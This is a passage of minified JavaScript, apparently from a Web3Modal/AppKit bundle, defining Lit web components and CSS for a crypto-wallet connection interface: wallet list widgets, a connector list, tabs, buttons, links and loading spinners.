    `:(this.style.cssText="display: none",null)}onConnectWallet(e){this.loading||We.selectWalletConnector(e)}hasWalletConnector(e){return this.connectors.some(t=>t.id===e.id||t.name===e.name)}isWalletCompatibleWithCurrentChain(e){const t=de.state.activeChain;return t&&e.chains?e.chains.some(i=>{const n=i.split(":")[0];return t===n}):!0}};IE([V()],jy.prototype,"tabIdx",void 0);IE([te()],jy.prototype,"connectors",void 0);IE([te()],jy.prototype,"loading",void 0);jy=IE([Ot("w3m-connect-recent-widget")],jy);var TE=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Fy=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.wallets=[],this.loading=!1,Ze.isTelegram()&&Ze.isIos()&&(this.loading=!ut.state.wcUri,this.unsubscribe.push(ut.subscribeKey("wcUri",e=>this.loading=!e)))}render(){const{connectors:e}=We.state,{customWallets:t,featuredWalletIds:i}=Be.state,n=Bt.getRecentWallets(),s=e.find(d=>d.id==="walletConnect"),a=e.filter(d=>d.type==="INJECTED"||d.type==="ANNOUNCED"||d.type==="MULTI_CHAIN").filter(d=>d.name!=="Browser Wallet");if(!s)return null;if(i||t||!this.wallets.length)return this.style.cssText="display: none",null;const c=a.length+n.length,l=Math.max(0,2-c),u=Og.filterOutDuplicateWallets(this.wallets).slice(0,l);return u.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${u.map(d=>F`
            <wui-list-wallet
              imageSrc=${ye(Es.getWalletImage(d))}
              name=${d?.name??"Unknown"}
              @click=${()=>this.onConnectWallet(d)}
              tabIdx=${ye(this.tabIdx)}
              ?loading=${this.loading}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnectWallet(e){if(this.loading)return;const t=We.getConnector(e.id,e.rdns);t?tt.push("ConnectingExternal",{connector:t}):tt.push("ConnectingWalletConnect",{wallet:e})}};TE([V()],Fy.prototype,"tabIdx",void 0);TE([V()],Fy.prototype,"wallets",void 0);TE([te()],Fy.prototype,"loading",void 0);Fy=TE([Ot("w3m-connect-recommended-widget")],Fy);var kE=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let qy=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=We.state.connectors,this.connectorImages=Ia.state.connectorImages,this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e),Ia.subscribeKey("connectorImages",e=>this.connectorImages=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){if(Ze.isMobile())return this.style.cssText="display: none",null;const e=this.connectors.find(i=>i.id==="walletConnect");if(!e)return this.style.cssText="display: none",null;const t=e.imageUrl||this.connectorImages[e?.imageId??""];return F`
      <wui-list-wallet
        imageSrc=${ye(t)}
        name=${e.name??"Unknown"}
        @click=${()=>this.onConnector(e)}
        tagLabel="qr code"
        tagVariant="main"
        tabIdx=${ye(this.tabIdx)}
        data-testid="wallet-selector-walletconnect"
      >
      </wui-list-wallet>
    `}onConnector(e){We.setActiveConnector(e),tt.push("ConnectingWalletConnect")}};kE([V()],qy.prototype,"tabIdx",void 0);kE([te()],qy.prototype,"connectors",void 0);kE([te()],qy.prototype,"connectorImages",void 0);qy=kE([Ot("w3m-connect-walletconnect-widget")],qy);const fht=ge`
  :host {
    margin-top: var(--wui-spacing-3xs);
  }
  wui-separator {
    margin: var(--wui-spacing-m) calc(var(--wui-spacing-m) * -1) var(--wui-spacing-xs)
      calc(var(--wui-spacing-m) * -1);
    width: calc(100% + var(--wui-spacing-s) * 2);
  }
`;var h6=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Lg=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=We.state.connectors,this.recommended=rt.state.recommended,this.featured=rt.state.featured,this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e),rt.subscribeKey("recommended",e=>this.recommended=e),rt.subscribeKey("featured",e=>this.featured=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      <wui-flex flexDirection="column" gap="xs"> ${this.connectorListTemplate()} </wui-flex>
    `}connectorListTemplate(){const{custom:e,recent:t,announced:i,injected:n,multiChain:s,recommended:o,featured:a,external:c}=o0.getConnectorsByType(this.connectors,this.recommended,this.featured);return o0.getConnectorTypeOrder({custom:e,recent:t,announced:i,injected:n,multiChain:s,recommended:o,featured:a,external:c}).map(u=>{switch(u){case"injected":return F`
            ${s.length?F`<w3m-connect-multi-chain-widget
                  tabIdx=${ye(this.tabIdx)}
                ></w3m-connect-multi-chain-widget>`:null}
            ${i.length?F`<w3m-connect-announced-widget
                  tabIdx=${ye(this.tabIdx)}
                ></w3m-connect-announced-widget>`:null}
            ${n.length?F`<w3m-connect-injected-widget
                  .connectors=${n}
                  tabIdx=${ye(this.tabIdx)}
                ></w3m-connect-injected-widget>`:null}
          `;case"walletConnect":return F`<w3m-connect-walletconnect-widget
            tabIdx=${ye(this.tabIdx)}
          ></w3m-connect-walletconnect-widget>`;case"recent":return F`<w3m-connect-recent-widget
            tabIdx=${ye(this.tabIdx)}
          ></w3m-connect-recent-widget>`;case"featured":return F`<w3m-connect-featured-widget
            .wallets=${a}
            tabIdx=${ye(this.tabIdx)}
          ></w3m-connect-featured-widget>`;case"custom":return F`<w3m-connect-custom-widget
            tabIdx=${ye(this.tabIdx)}
          ></w3m-connect-custom-widget>`;case"external":return F`<w3m-connect-external-widget
            tabIdx=${ye(this.tabIdx)}
          ></w3m-connect-external-widget>`;case"recommended":return F`<w3m-connect-recommended-widget
            .wallets=${o}
            tabIdx=${ye(this.tabIdx)}
          ></w3m-connect-recommended-widget>`;default:return console.warn(`Unknown connector type: ${u}`),null}})}};Lg.styles=fht;h6([V()],Lg.prototype,"tabIdx",void 0);h6([te()],Lg.prototype,"connectors",void 0);h6([te()],Lg.prototype,"recommended",void 0);h6([te()],Lg.prototype,"featured",void 0);Lg=h6([Ot("w3m-connector-list")],Lg);const pht=ge`
  :host {
    display: inline-flex;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-3xl);
    padding: var(--wui-spacing-3xs);
    position: relative;
    height: 36px;
    min-height: 36px;
    overflow: hidden;
  }

  :host::before {
    content: '';
    position: absolute;
    pointer-events: none;
    top: 4px;
    left: 4px;
    display: block;
    width: var(--local-tab-width);
    height: 28px;
    border-radius: var(--wui-border-radius-3xl);
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    transform: translateX(calc(var(--local-tab) * var(--local-tab-width)));
    transition: transform var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color, opacity;
  }

  :host([data-type='flex'])::before {
    left: 3px;
    transform: translateX(calc((var(--local-tab) * 34px) + (var(--local-tab) * 4px)));
  }

  :host([data-type='flex']) {
    display: flex;
    padding: 0px 0px 0px 12px;
    gap: 4px;
  }

  :host([data-type='flex']) > button > wui-text {
    position: absolute;
    left: 18px;
    opacity: 0;
  }

  button[data-active='true'] > wui-icon,
  button[data-active='true'] > wui-text {
    color: var(--wui-color-fg-100);
  }

  button[data-active='false'] > wui-icon,
  button[data-active='false'] > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='true']:disabled,
  button[data-active='false']:disabled {
    background-color: transparent;
    opacity: 0.5;
    cursor: not-allowed;
  }

  button[data-active='true']:disabled > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='false']:disabled > wui-text {
    color: var(--wui-color-fg-300);
  }

  button > wui-icon,
  button > wui-text {
    pointer-events: none;
    transition: color var(--wui-e ase-out-power-1) var(--wui-duration-md);
    will-change: color;
  }

  button {
    width: var(--local-tab-width);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color;
  }

  :host([data-type='flex']) > button {
    width: 34px;
    position: relative;
    display: flex;
    justify-content: flex-start;
  }

  button:hover:enabled,
  button:active:enabled {
    background-color: transparent !important;
  }

  button:hover:enabled > wui-icon,
  button:active:enabled > wui-icon {
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
    color: var(--wui-color-fg-125);
  }

  button:hover:enabled > wui-text,
  button:active:enabled > wui-text {
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
    color: var(--wui-color-fg-125);
  }

  button {
    border-radius: var(--wui-border-radius-3xl);
  }
`;var Dp=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Gd=class extends he{constructor(){super(...arguments),this.tabs=[],this.onTabChange=()=>null,this.buttons=[],this.disabled=!1,this.localTabWidth="100px",this.activeTab=0,this.isDense=!1}render(){return this.isDense=this.tabs.length>3,this.style.cssText=`
      --local-tab: ${this.activeTab};
      --local-tab-width: ${this.localTabWidth};
    `,this.dataset.type=this.isDense?"flex":"block",this.tabs.map((e,t)=>{const i=t===this.activeTab;return F`
        <button
          ?disabled=${this.disabled}
          @click=${()=>this.onTabClick(t)}
          data-active=${i}
          data-testid="tab-${e.label?.toLowerCase()}"
        >
          ${this.iconTemplate(e)}
          <wui-text variant="small-600" color="inherit"> ${e.label} </wui-text>
        </button>
      `})}firstUpdated(){this.shadowRoot&&this.isDense&&(this.buttons=[...this.shadowRoot.querySelectorAll("button")],setTimeout(()=>{this.animateTabs(0,!0)},0))}iconTemplate(e){return e.icon?F`<wui-icon size="xs" color="inherit" name=${e.icon}></wui-icon>`:null}onTabClick(e){this.buttons&&this.animateTabs(e,!1),this.activeTab=e,this.onTabChange(e)}animateTabs(e,t){const i=this.buttons[this.activeTab],n=this.buttons[e],s=i?.querySelector("wui-text"),o=n?.querySelector("wui-text"),a=n?.getBoundingClientRect(),c=o?.getBoundingClientRect();i&&s&&!t&&e!==this.activeTab&&(s.animate([{opacity:0}],{duration:50,easing:"ease",fill:"forwards"}),i.animate([{width:"34px"}],{duration:500,easing:"ease",fill:"forwards"})),n&&a&&c&&o&&(e!==this.activeTab||t)&&(this.localTabWidth=`${Math.round(a.width+c.width)+6}px`,n.animate([{width:`${a.width+c.width}px`}],{duration:t?0:500,fill:"forwards",easing:"ease"}),o.animate([{opacity:1}],{duration:t?0:125,delay:t?0:200,fill:"forwards",easing:"ease"}))}};Gd.styles=[Ii,vo,pht];Dp([V({type:Array})],Gd.prototype,"tabs",void 0);Dp([V()],Gd.prototype,"onTabChange",void 0);Dp([V({type:Array})],Gd.prototype,"buttons",void 0);Dp([V({type:Boolean})],Gd.prototype,"disabled",void 0);Dp([V()],Gd.prototype,"localTabWidth",void 0);Dp([te()],Gd.prototype,"activeTab",void 0);Dp([te()],Gd.prototype,"isDense",void 0);Gd=Dp([Ot("wui-tabs")],Gd);var NB=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let bx=class extends he{constructor(){super(...arguments),this.platformTabs=[],this.unsubscribe=[],this.platforms=[],this.onSelectPlatfrom=void 0}disconnectCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.generateTabs();return F`
      <wui-flex justifyContent="center" .padding=${["0","0","l","0"]}>
        <wui-tabs .tabs=${e} .onTabChange=${this.onTabChange.bind(this)}></wui-tabs>
      </wui-flex>
    `}generateTabs(){const e=this.platforms.map(t=>t==="browser"?{label:"Browser",icon:"extension",platform:"browser"}:t==="mobile"?{label:"Mobile",icon:"mobile",platform:"mobile"}:t==="qrcode"?{label:"Mobile",icon:"mobile",platform:"qrcode"}:t==="web"?{label:"Webapp",icon:"browser",platform:"web"}:t==="desktop"?{label:"Desktop",icon:"desktop",platform:"desktop"}:{label:"Browser",icon:"extension",platform:"unsupported"});return this.platformTabs=e.map(({platform:t})=>t),e}onTabChange(e){const t=this.platformTabs[e];t&&this.onSelectPlatfrom?.(t)}};NB([V({type:Array})],bx.prototype,"platforms",void 0);NB([V()],bx.prototype,"onSelectPlatfrom",void 0);bx=NB([Ot("w3m-connecting-header")],bx);const ght=ge`
  :host {
    display: flex;
  }

  :host([data-size='sm']) > svg {
    width: 12px;
    height: 12px;
  }

  :host([data-size='md']) > svg {
    width: 16px;
    height: 16px;
  }

  :host([data-size='lg']) > svg {
    width: 24px;
    height: 24px;
  }

  :host([data-size='xl']) > svg {
    width: 32px;
    height: 32px;
  }

  svg {
    animation: rotate 2s linear infinite;
  }

  circle {
    fill: none;
    stroke: var(--local-color);
    stroke-width: 4px;
    stroke-dasharray: 1, 124;
    stroke-dashoffset: 0;
    stroke-linecap: round;
    animation: dash 1.5s ease-in-out infinite;
  }

  :host([data-size='md']) > svg > circle {
    stroke-width: 6px;
  }

  :host([data-size='sm']) > svg > circle {
    stroke-width: 8px;
  }

  @keyframes rotate {
    100% {
      transform: rotate(360deg);
    }
  }

  @keyframes dash {
    0% {
      stroke-dasharray: 1, 124;
      stroke-dashoffset: 0;
    }

    50% {
      stroke-dasharray: 90, 124;
      stroke-dashoffset: -35;
    }

    100% {
      stroke-dashoffset: -125;
    }
  }
`;var PB=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let zy=class extends he{constructor(){super(...arguments),this.color="accent-100",this.size="lg"}render(){return this.style.cssText=`--local-color: ${this.color==="inherit"?"inherit":`var(--wui-color-${this.color})`}`,this.dataset.size=this.size,F`<svg viewBox="25 25 50 50">
      <circle r="20" cy="50" cx="50"></circle>
    </svg>`}};zy.styles=[Ii,ght];PB([V()],zy.prototype,"color",void 0);PB([V()],zy.prototype,"size",void 0);zy=PB([Ot("wui-loading-spinner")],zy);const mht=ge`
  :host {
    width: var(--local-width);
    position: relative;
  }

  button {
    border: none;
    border-radius: var(--local-border-radius);
    width: var(--local-width);
    white-space: nowrap;
  }

  /* -- Sizes --------------------------------------------------- */
  button[data-size='md'] {
    padding: 8.2px var(--wui-spacing-l) 9px var(--wui-spacing-l);
    height: 36px;
  }

  button[data-size='md'][data-icon-left='true'][data-icon-right='false'] {
    padding: 8.2px var(--wui-spacing-l) 9px var(--wui-spacing-s);
  }

  button[data-size='md'][data-icon-right='true'][data-icon-left='false'] {
    padding: 8.2px var(--wui-spacing-s) 9px var(--wui-spacing-l);
  }

  button[data-size='lg'] {
    padding: var(--wui-spacing-m) var(--wui-spacing-2l);
    height: 48px;
  }

  /* -- Variants --------------------------------------------------------- */
  button[data-variant='main'] {
    background-color: var(--wui-color-accent-100);
    color: var(--wui-color-inverse-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='inverse'] {
    background-color: var(--wui-color-inverse-100);
    color: var(--wui-color-inverse-000);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='accent'] {
    background-color: var(--wui-color-accent-glass-010);
    color: var(--wui-color-accent-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  button[data-variant='accent-error'] {
    background: var(--wui-color-error-glass-015);
    color: var(--wui-color-error-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-error-glass-010);
  }

  button[data-variant='accent-success'] {
    background: var(--wui-color-success-glass-015);
    color: var(--wui-color-success-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-success-glass-010);
  }

  button[data-variant='neutral'] {
    background: transparent;
    color: var(--wui-color-fg-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  /* -- Focus states --------------------------------------------------- */
  button[data-variant='main']:focus-visible:enabled {
    background-color: var(--wui-color-accent-090);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
  button[data-variant='inverse']:focus-visible:enabled {
    background-color: var(--wui-color-inverse-100);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-gray-glass-010),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
  button[data-variant='accent']:focus-visible:enabled {
    background-color: var(--wui-color-accent-glass-010);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
  button[data-variant='accent-error']:focus-visible:enabled {
    background: var(--wui-color-error-glass-015);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-error-100),
      0 0 0 4px var(--wui-color-error-glass-020);
  }
  button[data-variant='accent-success']:focus-visible:enabled {
    background: var(--wui-color-success-glass-015);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-success-100),
      0 0 0 4px var(--wui-color-success-glass-020);
  }
  button[data-variant='neutral']:focus-visible:enabled {
    background: var(--wui-color-gray-glass-005);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-gray-glass-010),
      0 0 0 4px var(--wui-color-gray-glass-002);
  }

  /* -- Hover & Active states ----------------------------------------------------------- */
  @media (hover: hover) and (pointer: fine) {
    button[data-variant='main']:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='main']:active:enabled {
      background-color: var(--wui-color-accent-080);
    }

    button[data-variant='accent']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }

    button[data-variant='accent']:active:enabled {
      background-color: var(--wui-color-accent-glass-020);
    }

    button[data-variant='accent-error']:hover:enabled {
      background: var(--wui-color-error-glass-020);
      color: var(--wui-color-error-100);
    }

    button[data-variant='accent-error']:active:enabled {
      background: var(--wui-color-error-glass-030);
      color: var(--wui-color-error-100);
    }

    button[data-variant='accent-success']:hover:enabled {
      background: var(--wui-color-success-glass-020);
      color: var(--wui-color-success-100);
    }

    button[data-variant='accent-success']:active:enabled {
      background: var(--wui-color-success-glass-030);
      color: var(--wui-color-success-100);
    }

    button[data-variant='neutral']:hover:enabled {
      background: var(--wui-color-gray-glass-002);
    }

    button[data-variant='neutral']:active:enabled {
      background: var(--wui-color-gray-glass-005);
    }

    button[data-size='lg'][data-icon-left='true'][data-icon-right='false'] {
      padding-left: var(--wui-spacing-m);
    }

    button[data-size='lg'][data-icon-right='true'][data-icon-left='false'] {
      padding-right: var(--wui-spacing-m);
    }
  }

  /* -- Disabled state --------------------------------------------------- */
  button:disabled {
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    color: var(--wui-color-gray-glass-020);
    cursor: not-allowed;
  }

  button > wui-text {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
    opacity: var(--local-opacity-100);
  }

  ::slotted(*) {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
    opacity: var(--local-opacity-100);
  }

  wui-loading-spinner {
    position: absolute;
    left: 50%;
    top: 50%;
    transform: translate(-50%, -50%);
    opacity: var(--local-opacity-000);
  }
`;var sh=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const GG={main:"inverse-100",inverse:"inverse-000",accent:"accent-100","accent-error":"error-100","accent-success":"success-100",neutral:"fg-100",disabled:"gray-glass-020"},wht={lg:"paragraph-600",md:"small-600"},bht={lg:"md",md:"md"};let fl=class extends he{constructor(){super(...arguments),this.size="lg",this.disabled=!1,this.fullWidth=!1,this.loading=!1,this.variant="main",this.hasIconLeft=!1,this.hasIconRight=!1,this.borderRadius="m"}render(){this.style.cssText=`
    --local-width: ${this.fullWidth?"100%":"auto"};
    --local-opacity-100: ${this.loading?0:1};
    --local-opacity-000: ${this.loading?1:0};
    --local-border-radius: var(--wui-border-radius-${this.borderRadius});
    `;const e=this.textVariant??wht[this.size];return F`
      <button
        data-variant=${this.variant}
        data-icon-left=${this.hasIconLeft}
        data-icon-right=${this.hasIconRight}
        data-size=${this.size}
        ?disabled=${this.disabled}
      >
        ${this.loadingTemplate()}
        <slot name="iconLeft" @slotchange=${()=>this.handleSlotLeftChange()}></slot>
        <wui-text variant=${e} color="inherit">
          <slot></slot>
        </wui-text>
        <slot name="iconRight" @slotchange=${()=>this.handleSlotRightChange()}></slot>
      </button>
    `}handleSlotLeftChange(){this.hasIconLeft=!0}handleSlotRightChange(){this.hasIconRight=!0}loadingTemplate(){if(this.loading){const e=bht[this.size],t=this.disabled?GG.disabled:GG[this.variant];return F`<wui-loading-spinner color=${t} size=${e}></wui-loading-spinner>`}return F``}};fl.styles=[Ii,vo,mht];sh([V()],fl.prototype,"size",void 0);sh([V({type:Boolean})],fl.prototype,"disabled",void 0);sh([V({type:Boolean})],fl.prototype,"fullWidth",void 0);sh([V({type:Boolean})],fl.prototype,"loading",void 0);sh([V()],fl.prototype,"variant",void 0);sh([V({type:Boolean})],fl.prototype,"hasIconLeft",void 0);sh([V({type:Boolean})],fl.prototype,"hasIconRight",void 0);sh([V()],fl.prototype,"borderRadius",void 0);sh([V()],fl.prototype,"textVariant",void 0);fl=sh([Ot("wui-button")],fl);const vht=ge`
  button {
    padding: var(--wui-spacing-4xs) var(--wui-spacing-xxs);
    border-radius: var(--wui-border-radius-3xs);
    background-color: transparent;
    color: var(--wui-color-accent-100);
  }

  button:disabled {
    background-color: transparent;
    color: var(--wui-color-gray-glass-015);
  }

  button:hover {
    background-color: var(--wui-color-gray-glass-005);
  }
`;var NE=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let f3=class extends he{constructor(){super(...arguments),this.tabIdx=void 0,this.disabled=!1,this.color="inherit"}render(){return F`
      <button ?disabled=${this.disabled} tabindex=${ye(this.tabIdx)}>
        <slot name="iconLeft"></slot>
        <wui-text variant="small-600" color=${this.color}>
          <slot></slot>
        </wui-text>
        <slot name="iconRight"></slot>
      </button>
    `}};f3.styles=[Ii,vo,vht];NE([V()],f3.prototype,"tabIdx",void 0);NE([V({type:Boolean})],f3.prototype,"disabled",void 0);NE([V()],f3.prototype,"color",void 0);f3=NE([Ot("wui-link")],f3);const yht=ge`
  :host {
    display: block;
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
  }

  svg {
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
  }

  rect {
    fill: none;
    stroke: var(--wui-color-accent-100);
    stroke-width: 4px;
    stroke-linecap: round;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`;var iae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let vx=class extends he{constructor(){super(...arguments),this.radius=36}render(){return this.svgLoaderTemplate()}svgLoaderTemplate(){const e=this.radius>50?50:this.radius,i=36-e,n=116+i,s=245+i,o=360+i*1.75;return F`
      <svg viewBox="0 0 110 110" width="110" height="110">
        <rect
          x="2"
          y="2"
          width="106"
          height="106"
          rx=${e}
          stroke-dasharray="${n} ${s}"
          stroke-dashoffset=${o}
        />
      </svg>
    `}};vx.styles=[Ii,yht];iae([V({type:Number})],vx.prototype,"radius",void 0);vx=iae([Ot("wui-loading-thumbnail")],vx);const xht=ge`
  button {
    border: none;
    border-radius: var(--wui-border-radius-3xl);
  }

  button[data-variant='main'] {
    background-color: var(--wui-color-accent-100);
    color: var(--wui-color-inverse-100);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='accent'] {
    background-color: var(--wui-color-accent-glass-010);
    color: var(--wui-color-accent-100);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  button[data-variant='gray'] {
    background-color: transparent;
    color: var(--wui-color-fg-200);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='shade'] {
    background-color: transparent;
    color: var(--wui-color-accent-100);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-size='sm'] {
    height: 32px;
    padding: 0 var(--wui-spacing-s);
  }

  button[data-size='md'] {
    height: 40px;
    padding: 0 var(--wui-spacing-l);
  }

  button[data-size='sm'] > wui-image {
    width: 16px;
    height: 16px;
  }

  button[data-size='md'] > wui-image {
    width: 24px;
    height: 24px;
  }

  button[data-size='sm'] > wui-icon {
    width: 12px;
    height: 12px;
  }

  button[data-size='md'] > wui-icon {
    width: 14px;
    height: 14px;
  }

  wui-image {
    border-radius: var(--wui-border-radius-3xl);
    overflow: hidden;
  }

  button.disabled > wui-icon,
  button.disabled > wui-image {
    filter: grayscale(1);
  }

  button[data-variant='main'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-color-accent-090);
  }

  button[data-variant='shade'] > wui-image,
  button[data-variant='gray'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  @media (hover: hover) and (pointer: fine) {
    button[data-variant='main']:focus-visible {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='main']:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='main']:active:enabled {
      background-color: var(--wui-color-accent-080);
    }

    button[data-variant='accent']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }

    button[data-variant='accent']:active:enabled {
      background-color: var(--wui-color-accent-glass-020);
    }

    button[data-variant='shade']:focus-visible,
    button[data-variant='gray']:focus-visible,
    button[data-variant='shade']:hover,
    button[data-variant='gray']:hover {
      background-color: var(--wui-color-gray-glass-002);
    }

    button[data-variant='gray']:active,
    button[data-variant='shade']:active {
      background-color: var(--wui-color-gray-glass-005);
    }
  }

  button.disabled {
    color: var(--wui-color-gray-glass-020);
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    pointer-events: none;
  }
`;var k2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let E0=class extends he{constructor(){super(...arguments),this.variant="accent",this.imageSrc="",this.disabled=!1,this.icon="externalLink",this.size="md",this.text=""}render(){const e=this.size==="sm"?"small-600":"paragraph-600";return F`
      <button
        class=${this.disabled?"disabled":""}
        data-variant=${this.variant}
        data-size=${this.size}
      >
        ${this.imageSrc?F`<wui-image src=${this.imageSrc}></wui-image>`:null}
        <wui-text variant=${e} color="inherit"> ${this.text} </wui-text>
        <wui-icon name=${this.icon} color="inherit" size="inherit"></wui-icon>
      </button>
    `}};E0.styles=[Ii,vo,xht];k2([V()],E0.prototype,"variant",void 0);k2([V()],E0.prototype,"imageSrc",void 0);k2([V({type:Boolean})],E0.prototype,"disabled",void 0);k2([V()],E0.prototype,"icon",void 0);k2([V()],E0.prototype,"size",void 0);k2([V()],E0.prototype,"text",void 0);E0=k2([Ot("wui-chip-button")],E0);const Cht=ge`
  wui-flex {
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
  }
